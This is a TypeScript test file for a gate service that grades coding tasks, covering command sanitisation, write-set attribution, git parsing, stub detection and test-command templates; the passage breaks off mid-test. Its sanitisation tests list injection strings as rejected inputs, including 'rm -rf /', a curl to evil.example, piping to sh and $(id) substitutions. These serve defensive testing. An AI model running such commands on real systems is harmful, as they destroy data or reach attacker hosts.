/**
 * Gate-system remediation tests — Audit R1/R2/R3.
 *
 * R1.1 — packet `testCommand` sanitisation (parse-time + defence-in-depth)
 * R1.2 — parallel-wave attribution (`exemptFiles`) + per-worktree command mutex
 * R1.4 — G6 honesty: no full-suite fallback, no red-proof without test files
 * R2.2 — stub-rule narrowing regression cases
 * R3.1 — ecosystem test-targeting templates (M2.6: Option 2)
 *
 * The git-backed scenarios use a real temp repository (same rationale as
 * blueprint-gates.test.ts: diff-base semantics cannot be faked with strings).
 *
 * Run: tsx src/main/services/__tests__/blueprint-gates-remediation.test.ts
 */
import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, dirname } from 'node:path'
import { test, describe, summaryAsync } from './test-harness'

import {
  captureGateBaseline,
  defaultCommandRunner,
  runGates,
  runWaveCommandGates,
  type CommandOutcome,
  type CommandRunner,
  type GateTaskContext
} from '../blueprint-gates.service'
import { extractWorkPacket } from '../../../shared/work-packet-parser'
import { isSafeGateCommand } from '../../../shared/gate-command-types'
import {
  buildTestCommand,
  detectTestToolchain
} from '../../../shared/gate-test-targeting'
import { scanAddedLinesForStubs } from '../../../shared/gate-analysis'
import type { BlueprintWorkPacket } from '../../../shared/blueprint-types'

// ── Helpers ──

const GIT_AVAILABLE = (() => {
  try {
    execFileSync('git', ['--version'], { stdio: 'ignore' })
    return true
  } catch {
    return false
  }
})()

const tempDirs: string[] = []

function makeRepo(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), 'gate-remediation-'))
  tempDirs.push(dir)
  execFileSync('git', ['init', '-q'], { cwd: dir })
  execFileSync('git', ['config', 'user.email', 'gate@test.local'], { cwd: dir })
  execFileSync('git', ['config', 'user.name', 'Gate Test'], { cwd: dir })
  execFileSync('git', ['config', 'commit.gpgsign', 'false'], { cwd: dir })
  write(dir, files)
  execFileSync('git', ['add', '-A'], { cwd: dir })
  execFileSync('git', ['commit', '-q', '-m', 'baseline'], { cwd: dir })
  return dir
}

function write(dir: string, files: Record<string, string>): void {
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(dir, rel)
    mkdirSync(dirname(abs), { recursive: true })
    writeFileSync(abs, content)
  }
}

function cleanup(): void {
  for (const dir of tempDirs.splice(0)) {
    try {
      rmSync(dir, { recursive: true, force: true })
    } catch {
      /* best effort */
    }
  }
}

function gitRunner(script: Record<string, Partial<CommandOutcome>>): CommandRunner {
  return async (command, opts) => {
    if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
    const entry = script[command]
    if (!entry) {
      return {
        exitCode: null,
        output: [],
        timedOut: false,
        spawnError: 'command not found',
        durationMs: 1
      }
    }
    return {
      exitCode: entry.exitCode ?? 0,
      output: entry.output ?? [],
      timedOut: entry.timedOut ?? false,
      ...(entry.spawnError ? { spawnError: entry.spawnError } : {}),
      durationMs: 1
    }
  }
}

/** A runner whose test command flips from red to green across the two calls. */
function redThenGreenRunner(testCommand: string): CommandRunner {
  let calls = 0
  return async (command, opts) => {
    if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
    if (command === testCommand) {
      calls++
      return calls === 1
        ? { exitCode: 1, output: ['1 failing'], timedOut: false, durationMs: 1 }
        : { exitCode: 0, output: ['all pass'], timedOut: false, durationMs: 1 }
    }
    return { exitCode: 0, output: [], timedOut: false, durationMs: 1 }
  }
}

const PACKET: BlueprintWorkPacket = {
  allowedFiles: ['src/feature.ts'],
  testFiles: ['src/feature.test.ts'],
  testCommand: 'run-task-tests'
}

function ctxFor(
  dir: string,
  runner: CommandRunner,
  over: Partial<GateTaskContext> = {}
): GateTaskContext {
  return {
    blueprintId: 'bp-remediation',
    taskId: 'T001',
    workspacePath: dir,
    executionPath: dir,
    plannedFiles: [],
    packet: PACKET,
    commands: {
      lint: { command: 'run-lint', provenance: 'detected' },
      build: { command: 'run-build', provenance: 'detected' }
    },
    runner,
    ...over
  }
}

function verdictOf(
  gates: { name: string; verdict: string }[],
  name: string
): string | undefined {
  return gates.find((g) => g.name === name)?.verdict
}

// ═══════════════════════════════════════════════════════════════════════════
// R1.1 — packet testCommand sanitisation
// ═══════════════════════════════════════════════════════════════════════════

describe('R1.1 — packet testCommand sanitisation', () => {
  const INJECTION_STRINGS = [
    'npm test; rm -rf /',
    'npm test && curl http://evil.example',
    'npm test | sh',
    'npm test > /etc/passwd',
    'npm test `whoami`',
    'npm test $(id)',
    'npm test {1..3}',
    'npm\ntest',
    'npm\rtest'
  ]

  test('extractWorkPacket drops unsafe testCommand values at parse time', () => {
    for (const injection of INJECTION_STRINGS) {
      const packet = extractWorkPacket({ testCommand: injection })
      assert.equal(
        packet?.testCommand,
        undefined,
        `injection must be dropped: ${JSON.stringify(injection)}`
      )
    }
  })

  test('extractWorkPacket keeps a safe testCommand', () => {
    const packet = extractWorkPacket({ testCommand: 'npm run test:unit' })
    assert.equal(packet?.testCommand, 'npm run test:unit')
  })

  test('a packet with ONLY an unsafe testCommand still parses (other fields survive)', () => {
    const packet = extractWorkPacket({
      allowedFiles: ['src/a.ts'],
      testCommand: 'npm test; rm -rf /'
    })
    assert.deepEqual(packet?.allowedFiles, ['src/a.ts'])
    assert.equal(packet?.testCommand, undefined)
  })

  test('defence-in-depth: an unsafe packet testCommand yields task-tests unverifiable/no_command', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    // A packet that bypassed the parser (pre-guard DB row) still carries the
    // injection string — the gate service must treat it as absent.
    const ctx = ctxFor(dir, gitRunner({}), {
      packet: { ...PACKET, testCommand: 'npm test; rm -rf /' }
    })
    const baseline = await captureGateBaseline(ctx)
    assert.equal(baseline.redProof, 'unavailable', 'no safe command → no red proof')

    write(dir, { 'src/feature.ts': 'export const a = 2\n' })
    const report = await runGates(ctx, baseline)
    const tests = report.gates.find((g) => g.name === 'task-tests')!
    assert.equal(tests.verdict, 'unverifiable')
    assert.equal(tests.reason, 'no_command')
  })

  test('isSafeGateCommand accepts the commands real toolchains produce', () => {
    for (const safe of [
      'npm run test:unit',
      'npx vitest run src/a.test.ts',
      'pytest tests/test_api.py',
      'go test ./src/...',
      'cargo test --test integration',
      'dotnet test tests/Api.Tests.csproj'
    ]) {
      assert.ok(isSafeGateCommand(safe), `must be safe: ${safe}`)
    }
  })
})

// ═════════════════════════════════════════════════════════ packet ═════════

describe('R1.4 — G6 honesty without per-task targeting', () => {
  test('no packet testCommand and no manifests → task-tests unverifiable/no_command (never the full suite)', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    const ctx = ctxFor(dir, gitRunner({ 'run-lint': {}, 'run-build': {} }), {
      packet: { allowedFiles: ['src/feature.ts'], testFiles: ['src/feature.test.ts'] },
      commands: {
        lint: { command: 'run-lint', provenance: 'detected' },
        build: { command: 'run-build', provenance: 'detected' },
        // The resolved FULL-suite command — must NOT be picked up by G6.
        test: { command: 'npm run test:full-suite', provenance: 'detected' }
      }
    })
    const baseline = await captureGateBaseline(ctx)
    write(dir, { 'src/feature.ts': 'export const a = 2\n' })

    const report = await runGates(ctx, baseline)
    const tests = report.gates.find((g) => g.name === 'task-tests')!
    assert.equal(tests.verdict, 'unverifiable')
    assert.equal(tests.reason, 'no_command')
    assert.ok(
      !report.gates.some((g) => g.evidence.some((e) => e.includes('test:full-suite'))),
      'the full-suite command must never appear in task gate evidence'
    )
  })

  test('captureRedProof is skipped when the packet declares no test files', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({ 'src/feature.ts': 'export const a = 1\n' })
    let commandsRun = 0
    const runner: CommandRunner = async (command, opts) => {
      if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
      commandsRun++
      return { exitCode: 0, output: [], timedOut: false, durationMs: 1 }
    }
    const ctx = ctxFor(dir, runner, {
      packet: { allowedFiles: ['src/feature.ts'] },
      commands: { test: { command: 'npm run test:full-suite', provenance: 'detected' } }
    })

    const baseline = await captureGateBaseline(ctx)
    assert.equal(baseline.redProof, 'unavailable')
    assert.ok(
      baseline.redEvidence.some((e) => e.includes('no test files')),
      `evidence must explain why: ${baseline.redEvidence.join(' | ')}`
    )
    assert.equal(commandsRun, 0, 'no command may run when there is nothing to prove red')
  })
})

// ═══════════════════════════════════════════════════════════════════════════
// R1.2 — parallel-wave attribution + gate mutex
// ═══════════════════════════════════════════════════════════════════════════

describe('R1.2 — parallel-wave attribution (exemptFiles)', () => {
  test('a peer task’s concurrent edits are exempted from this task’s write-set', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n",
      'src/peer.ts': 'export const peer = 1\n'
    })
    const ctx = ctxFor(dir, gitRunner({ 'run-task-tests': { exitCode: 0 } }), {
      exemptFiles: ['src/peer.ts']
    })
    const baseline = await captureGateBaseline(ctx)

    // BOTH tasks edit their own files in the shared worktree.
    write(dir, {
      'src/feature.ts': 'export const a = 2\n',
      'src/peer.ts': 'export const peer = 2\n'
    })
    const report = await runGates(ctx, baseline)

    assert.equal(
      verdictOf(report.gates, 'write-set'),
      'pass',
      `peer file must be exempt: ${JSON.stringify(report.gates[0].evidence)}`
    )
  })

  test('exempt files are also excluded from the stub scan (peer’s TODO is not this task’s)', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n",
      'src/peer.ts': 'export const peer = 1\n'
    })
    const ctx = ctxFor(dir, gitRunner({ 'run-task-tests': { exitCode: 0 } }), {
      exemptFiles: ['src/peer.ts']
    })
    const baseline = await captureGateBaseline(ctx)

    write(dir, {
      'src/feature.ts': 'export const a = 2\n',
      'src/peer.ts': 'export const peer = 2 // TODO: peer will finish this\n'
    })
    const report = await runGates(ctx, baseline)

    assert.equal(verdictOf(report.gates, 'stub-scan'), 'pass')
  })

  test('exemption is exact-path: a peer’s src/ does not exempt this task’s src/other.ts', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n",
      'src/peer.ts': 'export const peer = 1\n',
      'src/unrelated.ts': 'export const u = 1\n'
    })
    const ctx = ctxFor(dir, gitRunner({}), {
      exemptFiles: ['src/peer.ts']
    })
    const baseline = await captureGateBaseline(ctx)

    write(dir, { 'src/unrelated.ts': 'export const u = 2\n' })
    const report = await runGates(ctx, baseline)

    assert.equal(verdictOf(report.gates, 'write-set'), 'fail')
  })

  test('two-task interference: each task passes with the other’s files exempted', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/a.ts': 'export const a = 1\n',
      'src/a.test.ts': "test('a', () => {})\n",
      'src/b.ts': 'export const b = 1\n',
      'src/b.test.ts': "test('b', () => {})\n"
    })

    // Both tasks run "concurrently" in the shared tree: both edits land before
    // either task is graded. With correct attribution each passes.
    write(dir, { 'src/a.ts': 'export const a = 2\n', 'src/b.ts': 'export const b = 2\n' })

    const results = await Promise.all(
      ['a', 'b'].map(async (which) => {
        const ctx: GateTaskContext = ctxFor(
          dir,
          redThenGreenRunner('run-task-tests'),
          {
            taskId: `T00${which.toUpperCase()}`,
            packet: {
              allowedFiles: [`src/${which}.ts`],
              testFiles: [`src/${which}.test.ts`],
              testCommand: 'run-task-tests'
            },
            exemptFiles: which === 'a' ? ['src/b.ts'] : ['src/a.ts']
          }
        )
        const baseline = await captureGateBaseline(ctx)
        return runGates(ctx, baseline)
      })
    )

    for (const report of results) {
      assert.equal(report.overall, 'pass', JSON.stringify(report.gates, null, 2))
    }
  })

  test('app-bookkeeping paths are prefix-exempt, not exact-match exempt', async () => {
    if (!GIT_AVAILABLE) return
    // The app writes `.opencode/agents/*` at every session start and rewrites
    // `blueprints/<id>/plan.md` as the pipeline advances — both land AFTER the
    // baseline snapshot, so an exact-match exemption on `.opencode/` never fires
    // and G4 attributes the app's own writes to whichever task is being graded.
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n",
      '.opencode/agents/davinci.md': '# davinci\n'
    })
    const ctx = ctxFor(dir, gitRunner({ 'run-task-tests': { exitCode: 0 } }), {
      artifactPrefix: 'blueprints/bp-1'
    })
    const baseline = await captureGateBaseline(ctx)

    write(dir, {
      // The task's own, declared work.
      'src/feature.ts': 'export const a = 2\n',
      // The app's work: one tracked rewrite (diff path) and one new file
      // (untracked path). Neither is in the packet's allowedFiles.
      '.opencode/agents/davinci.md': '# davinci (rewritten at session start)\n',
      'blueprints/bp-1/plan.md': '# plan\n'
    })
    const report = await runGates(ctx, baseline)

    assert.equal(
      verdictOf(report.gates, 'write-set'),
      'pass',
      `app-bookkeeping writes must not be attributed to the task: ${JSON.stringify(
        report.gates.find((g) => g.name === 'write-set')?.evidence
      )}`
    )
  })

  test('.pm-state/ is exempt at any depth', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    const ctx = ctxFor(dir, gitRunner({ 'run-task-tests': { exitCode: 0 } }))
    const baseline = await captureGateBaseline(ctx)

    write(dir, {
      'src/feature.ts': 'export const a = 2\n',
      '.pm-state/logs/x.log': 'process manager state\n',
      '.atelierignore': 'dist\n'
    })
    const report = await runGates(ctx, baseline)

    assert.equal(
      verdictOf(report.gates, 'write-set'),
      'pass',
      JSON.stringify(report.gates.find((g) => g.name === 'write-set')?.evidence)
    )
  })

  test('NEGATIVE CONTROL — .opencodex/ is not .opencode/ and must still fail', async () => {
    if (!GIT_AVAILABLE) return
    // Guards the exemption against being "simplified" into a naive startsWith:
    // `pathMatches` only matches on a segment boundary, and a sibling directory
    // whose name merely starts with the same letters is ordinary task work.
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    const ctx = ctxFor(dir, gitRunner({}))
    const baseline = await captureGateBaseline(ctx)

    write(dir, { '.opencodex/foo.md': '# not the app\n' })
    const report = await runGates(ctx, baseline)

    assert.equal(verdictOf(report.gates, 'write-set'), 'fail')
    assert.ok(
      report.gates
        .find((g) => g.name === 'write-set')!
        .evidence.some((e) => e.includes('.opencodex/foo.md')),
      'the evidence must name the offending path'
    )
  })

  test('the artifact exemption is scoped — ANOTHER blueprint’s artifacts still fail', async () => {
    if (!GIT_AVAILABLE) return
    // `blueprints/` as a blanket prefix would blind G4 to every write under a
    // workspace's own blueprints tree. Only the ACTIVE blueprint's dir is the
    // app's bookkeeping.
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    const ctx = ctxFor(dir, gitRunner({}), { artifactPrefix: 'blueprints/bp-active' })
    const baseline = await captureGateBaseline(ctx)

    write(dir, {
      'blueprints/bp-active/plan.md': '# mine\n',
      'blueprints/bp-other/plan.md': '# not mine\n'
    })
    const report = await runGates(ctx, baseline)
    const writeSet = report.gates.find((g) => g.name === 'write-set')!

    assert.equal(verdictOf(report.gates, 'write-set'), 'fail')
    assert.ok(
      writeSet.evidence.some((e) => e.includes('bp-other')),
      `the sibling blueprint must be reported: ${JSON.stringify(writeSet.evidence)}`
    )
    assert.ok(
      !writeSet.evidence.some((e) => e.includes('bp-active')),
      'the active blueprint’s own artifacts must stay exempt'
    )
  })

  test('peer-review re-grade: the synthetic empty baseline leaves bookkeeping as the only shield', async () => {
    if (!GIT_AVAILABLE) return
    // The peer-review re-grade builds a baseline with `preexistingDirty: []`, so
    // the pre-existing-dirt exemption cannot fire at all and the app-bookkeeping
    // prefixes are the sole protection against grading the app's own writes.
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    const ctx = ctxFor(dir, gitRunner({ 'run-task-tests': { exitCode: 0 } }), {
      artifactPrefix: 'blueprints/bp-1'
    })
    const captured = await captureGateBaseline(ctx)

    write(dir, {
      'src/feature.ts': 'export const a = 2\n',
      '.opencode/agents/davinci.md': '# rewritten\n',
      'blueprints/bp-1/tasks.md': '# tasks\n'
    })

    const syntheticBaseline = { ...captured, preexistingDirty: [] }
    const report = await runGates(ctx, syntheticBaseline)

    assert.equal(
      verdictOf(report.gates, 'write-set'),
      'pass',
      JSON.stringify(report.gates.find((g) => g.name === 'write-set')?.evidence)
    )
  })

  test('the exemption is observable — dropped paths are counted on the write-set gate', async () => {
    if (!GIT_AVAILABLE) return
    // An over-broad exemption swallowing a real violation is otherwise invisible:
    // the gate just says "all in set" and never mentions what it discarded.
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    const ctx = ctxFor(dir, gitRunner({ 'run-task-tests': { exitCode: 0 } }), {
      artifactPrefix: 'blueprints/bp-1'
    })
    const baseline = await captureGateBaseline(ctx)

    write(dir, {
      'src/feature.ts': 'export const a = 2\n',
      '.opencode/agents/davinci.md': '# rewritten\n',
      'blueprints/bp-1/plan.md': '# plan\n'
    })
    const report = await runGates(ctx, baseline)
    const writeSet = report.gates.find((g) => g.name === 'write-set')!

    assert.equal(writeSet.verdict, 'pass')
    assert.equal(writeSet.counts?.exemptBookkeeping, 2)
  })
})

// ═══════════════════════════════════════════════════════════════════════════
// Git plumbing: full capture and NUL-separated listings
// ═══════════════════════════════════════════════════════════════════════════

describe('git plumbing is data, not evidence', () => {
  test('every pre-existing dirty file is captured — not just the last 40', async () => {
    if (!GIT_AVAILABLE) return
    // The command runner keeps an evidence TAIL for lint/build/test. Applied to
    // `git status`, that tail silently discards every dirty file but the last
    // 40, so those files stop counting as pre-existing and G4 blames the task
    // for the user's own uncommitted edits.
    const files: Record<string, string> = {}
    for (let i = 0; i < 60; i++) files[`src/f${i}.ts`] = `export const v${i} = 1\n`
    const dir = makeRepo(files)

    const dirtied: Record<string, string> = {}
    for (let i = 0; i < 60; i++) dirtied[`src/f${i}.ts`] = `export const v${i} = 2\n`
    write(dir, dirtied)

    const baseline = await captureGateBaseline(ctxFor(dir, gitRunner({})))

    assert.equal(
      baseline.preexistingDirty.length,
      60,
      'a truncated status makes the user’s own edits look like the task’s'
    )
    assert.ok(baseline.preexistingDirty.includes('src/f0.ts'), 'the FIRST entry must survive')
  })

  test('a violation buried above 40 lines of allowed diff is still caught', async () => {
    if (!GIT_AVAILABLE) return
    // git diff emits files alphabetically, so `src/aaa-violation.ts` lands at
    // the TOP — exactly the part a tail-only capture throws away, turning a real
    // violation into a silent pass.
    const dir = makeRepo({
      'src/aaa-violation.ts': 'export const bad = 1\n',
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    const ctx = ctxFor(dir, gitRunner({}))
    const baseline = await captureGateBaseline(ctx)

    const bulk = Array.from({ length: 80 }, (_, i) => `export const x${i} = ${i}`).join('\n')
    write(dir, {
      'src/aaa-violation.ts': 'export const bad = 2\n',
      'src/feature.ts': `export const a = 2\n${bulk}\n`
    })
    const report = await runGates(ctx, baseline)
    const writeSet = report.gates.find((g) => g.name === 'write-set')!

    assert.equal(writeSet.verdict, 'fail')
    assert.ok(
      writeSet.evidence.some((e) => e.includes('src/aaa-violation.ts')),
      `the buried violation must be reported: ${JSON.stringify(writeSet.evidence)}`
    )
  })

  test('non-ASCII paths survive core.quotePath instead of arriving escaped', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    // The default, made explicit: this is the setting that mangles the path.
    execFileSync('git', ['config', 'core.quotePath', 'true'], { cwd: dir })

    const ctx = ctxFor(dir, gitRunner({}))
    const baseline = await captureGateBaseline(ctx)

    write(dir, { 'src/Café.cs': 'var x = 1;\n' })
    const report = await runGates(ctx, baseline)
    const writeSet = report.gates.find((g) => g.name === 'write-set')!

    assert.equal(writeSet.verdict, 'fail')
    assert.ok(
      !writeSet.evidence.some((e) => e.includes('\\303')),
      `the path must not arrive octal-escaped: ${JSON.stringify(writeSet.evidence)}`
    )
    assert.ok(
      writeSet.evidence.some((e) => e.includes('.cs') && e.includes('src/Caf')),
      `the real path must be reported: ${JSON.stringify(writeSet.evidence)}`
    )
  })

  test('a renamed file’s pre-image is not mistaken for its own status record', async () => {
    if (!GIT_AVAILABLE) return
    // `-z` drops the ` -> ` and emits `R  <to>\0<from>\0`. Reading the second
    // field as a record would slice three characters off the front of a real
    // path and add that garbage to the dirty list.
    const dir = makeRepo({ 'src/old-name.ts': 'export const a = 1\n' })
    execFileSync('git', ['mv', 'src/old-name.ts', 'src/new-name.ts'], { cwd: dir })

    const baseline = await captureGateBaseline(ctxFor(dir, gitRunner({})))

    assert.deepEqual(baseline.preexistingDirty, ['src/new-name.ts'])
  })
})

describe('R1.2 — per-worktree command mutex', () => {
  test('command gates never overlap in one worktree (lint/build/test serialise)', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })

    let running = 0
    let maxConcurrent = 0
    const trackingRunner: CommandRunner = async (command, opts) => {
      if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
      running++
      maxConcurrent = Math.max(maxConcurrent, running)
      await new Promise((r) => setTimeout(r, 25))
      running--
      return { exitCode: 0, output: [], timedOut: false, durationMs: 25 }
    }

    // Two tasks in the SAME worktree run their command gates concurrently.
    const ctxA = ctxFor(dir, trackingRunner, { taskId: 'TA' })
    const ctxB = ctxFor(dir, trackingRunner, { taskId: 'TB' })
    const baselineA = await captureGateBaseline(ctxA)
    const baselineB = await captureGateBaseline(ctxB)
    write(dir, { 'src/feature.ts': 'export const a = 2\n' })

    await Promise.all([runGates(ctxA, baselineA), runGates(ctxB, baselineB)])

    assert.equal(
      maxConcurrent,
      1,
      `command gates must serialise per worktree (observed ${maxConcurrent} concurrent)`
    )
  })

  test('different worktrees do not block each other', async () => {
    if (!GIT_AVAILABLE) return
    const dirA = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    const dirB = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })

    let running = 0
    let maxConcurrent = 0
    const trackingRunner: CommandRunner = async (command, opts) => {
      if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
      running++
      maxConcurrent = Math.max(maxConcurrent, running)
      await new Promise((r) => setTimeout(r, 25))
      running--
      return { exitCode: 0, output: [], timedOut: false, durationMs: 25 }
    }

    const ctxA = ctxFor(dirA, trackingRunner)
    const ctxB = ctxFor(dirB, trackingRunner)
    await captureGateBaseline(ctxA)
    await captureGateBaseline(ctxB)
    write(dirA, { 'src/feature.ts': 'export const a = 2\n' })
    write(dirB, { 'src/feature.ts': 'export const a = 2\n' })

    // Run ONLY the command gates concurrently — the full runGates sequence is
    // sequential within a task, so the overlap window is the command phase.
    await Promise.all([runWaveCommandGates(ctxA), runWaveCommandGates(ctxB)])

    assert.equal(
      maxConcurrent,
      2,
      `independent worktrees must run in parallel (observed ${maxConcurrent})`
    )
  })
})

// ═══════════════════════════════════════════════════════════════════════════
// R2.2 — stub-rule narrowing (regression cases from the false-positive audit)
// ═══════════════════════════════════════════════════════════════════════════

describe('R2.2 — stub-rule narrowing', () => {
  const line = (text: string) => [{ file: 'src/x.ts', line: 1, text }]

  test('const config = {} is NOT a stub (real, if trivial, initialisation)', () => {
    assert.equal(scanAddedLinesForStubs(line('const config = {}')).length, 0)
  })

  test('return [] as a real implementation is NOT a stub', () => {
    assert.equal(scanAddedLinesForStubs(line('return []')).length, 0)
  })

  test('return null with no comment is NOT a stub', () => {
    assert.equal(scanAddedLinesForStubs(line('return null')).length, 0)
  })

  test('type annotation with empty object is NOT a stub', () => {
    assert.equal(scanAddedLinesForStubs(line('const x: Record<string, never> = {}')).length, 0)
  })

  test('empty arrow-function body assigned to a const is NOT flagged by the removed rule', () => {
    // The bare `/\{\s*\}\s*$/` rule used to fire here.
    assert.equal(scanAddedLinesForStubs(line('const noop = () => {}')).length, 0)
  })

  test('return null followed by a TODO-style comment IS a stub', () => {
    // `stub`/`placeholder` wording is matched by the placeholder-return rule
    // itself; `TODO`/`FIXME` wording is caught by the earlier marker rules.
    const findings = scanAddedLinesForStubs(line('return null // stub — real version coming'))
    assert.equal(findings.length, 1)
    assert.equal(findings[0].kind, 'placeholder-return')
  })

  test('return None with a Python placeholder comment IS a stub', () => {
    const findings = scanAddedLinesForStubs(line('return None  # placeholder for now'))
    assert.equal(findings.length, 1)
    assert.equal(findings[0].kind, 'placeholder-return')
  })

  test('pass / ... bodies are still stubs', () => {
    assert.equal(scanAddedLinesForStubs(line('  pass')).length, 1)
    assert.equal(scanAddedLinesForStubs(line('  ...')).length, 1)
  })

  test('TODO / FIXME markers are still stubs', () => {
    assert.equal(scanAddedLinesForStubs(line('// TODO: later')).length, 1)
    assert.equal(scanAddedLinesForStubs(line('// FIXME: broken')).length, 1)
  })

  test('NotImplementedError is still a stub', () => {
    assert.equal(
      scanAddedLinesForStubs(line('  raise NotImplementedError("soon")')).length,
      1
    )
  })
})

// ═══════════════════════════════════════════════════════════════════════════
// R3.1 — ecosystem test-targeting templates (M2.6: Option 2)
// ═══════════════════════════════════════════════════════════════════════════

describe('R3.1 — buildTestCommand templates', () => {
  test('vitest: narrow run with explicit paths', () => {
    assert.equal(
      buildTestCommand('vitest', ['src/a.test.ts', 'src/b.test.ts']),
      'npx vitest run src/a.test.ts src/b.test.ts'
    )
  })

  test('jest: positional patterns', () => {
    assert.equal(buildTestCommand('jest', ['src/a.test.ts']), 'npx jest src/a.test.ts')
  })

  test('pytest: plain paths', () => {
    assert.equal(buildTestCommand('pytest', ['tests/test_api.py']), 'pytest tests/test_api.py')
  })

  test('go: test files map to package directories', () => {
    assert.equal(
      buildTestCommand('go', ['pkg/foo/foo_test.go', 'pkg/bar/bar_test.go']),
      'go test ./pkg/foo ./pkg/bar'
    )
  })

  test('go: root-level test file targets the root package', () => {
    assert.equal(buildTestCommand('go', ['main_test.go']), 'go test .')
  })

  test('dotnet: a csproj path is targetable', () => {
    assert.equal(
      buildTestCommand('dotnet', ['tests/Api.Tests.csproj']),
      'dotnet test tests/Api.Tests.csproj'
    )
  })

  test('dotnet: a source file is NOT targetable — null, never a disguised full run', () => {
    assert.equal(buildTestCommand('dotnet', ['src/Program.cs']), null)
  })

  test('cargo: tests/<name>.rs maps to --test <name>', () => {
    assert.equal(
      buildTestCommand('cargo', ['tests/integration.rs']),
      'cargo test --test integration'
    )
  })

  test('cargo: unit tests in src/ are NOT targetable', () => {
    assert.equal(buildTestCommand('cargo', ['src/lib.rs']), null)
  })

  test('no toolchain → null', () => {
    assert.equal(buildTestCommand(undefined, ['src/a.test.ts']), null)
  })

  test('no files → null', () => {
    assert.equal(buildTestCommand('vitest', []), null)
  })

  test('unsafe paths are dropped, not escaped', () => {
    assert.equal(
      buildTestCommand('pytest', ['tests/ok.py', 'tests/$(evil).py', 'tests/sp ace.py']),
      'pytest tests/ok.py'
    )
  })

  test('every generated command passes isSafeGateCommand', () => {
    const samples = [
      buildTestCommand('vitest', ['src/a.test.ts']),
      buildTestCommand('jest', ['src/a.test.ts']),
      buildTestCommand('pytest', ['tests/test_api.py']),
      buildTestCommand('go', ['pkg/foo/foo_test.go']),
      buildTestCommand('dotnet', ['tests/Api.Tests.csproj']),
      buildTestCommand('cargo', ['tests/integration.rs'])
    ]
    for (const cmd of samples) {
      assert.ok(cmd && isSafeGateCommand(cmd), `unsafe template: ${cmd}`)
    }
  })
})

describe('R3.1 — detectTestToolchain', () => {
  test('vitest wins over jest when both are present', () => {
    assert.equal(
      detectTestToolchain({ packageJson: '{"devDependencies":{"vitest":"^3","jest":"^29"}}' }),
      'vitest'
    )
  })

  test('jest detected from devDependencies', () => {
    assert.equal(
      detectTestToolchain({ packageJson: '{"devDependencies":{"jest":"^29"}}' }),
      'jest'
    )
  })

  test('pytest from pyproject or config file', () => {
    assert.equal(detectTestToolchain({ pyprojectToml: '[tool.pytest.ini_options]' }), 'pytest')
    assert.equal(detectTestToolchain({ hasPytestConfig: true }), 'pytest')
  })

  test('dotnet from csproj', () => {
    assert.equal(detectTestToolchain({ dotnetProjects: ['src/Api.csproj'] }), 'dotnet')
  })

  test('cargo from Cargo.toml', () => {
    assert.equal(detectTestToolchain({ cargoToml: '[package]\nname="x"' }), 'cargo')
  })

  test('go from go.mod', () => {
    assert.equal(detectTestToolchain({ goMod: 'module example.com/x\n' }), 'go')
  })

  test('empty manifests → null', () => {
    assert.equal(detectTestToolchain({}), null)
  })
})

describe('R3.1 — template as G6 default (integration)', () => {
  test('packet testFiles + manifests → template command runs as the task test', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    let templateCommand: string | null = null
    let templateCalls = 0
    const runner: CommandRunner = async (command, opts) => {
      if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
      if (command.startsWith('npx vitest')) {
        templateCommand = command
        templateCalls++
        return templateCalls === 1
          ? { exitCode: 1, output: ['1 failing'], timedOut: false, durationMs: 1 }
          : { exitCode: 0, output: ['all pass'], timedOut: false, durationMs: 1 }
      }
      return { exitCode: 0, output: [], timedOut: false, durationMs: 1 }
    }
